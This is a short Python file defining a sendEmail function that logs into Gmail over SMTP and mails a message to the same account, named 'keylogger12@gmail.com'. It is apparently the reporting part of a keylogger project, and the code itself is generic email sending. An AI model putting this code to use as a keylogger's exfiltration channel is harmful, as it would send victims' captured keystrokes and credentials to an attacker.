import smtplib, ssl

def sendEmail(message):
    smtp_server = "smtp.gmail.com"
    port = 587  # For starttls
    sender_email = "keylogger12@gmail.com"
    password = "enter your password here"
    receiver_email = "keylogger12@gmail.com"

    context = ssl.create_default_context()

    try:
        server = smtplib.SMTP(smtp_server, port)
        server.ehlo()  # Can be omitted
        server.starttls(context=context)  # Secure the connection
        server.ehlo()  # Can be omitted
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, message) 

    except Exception as e:
        print(e)
    finally:
        server.quit()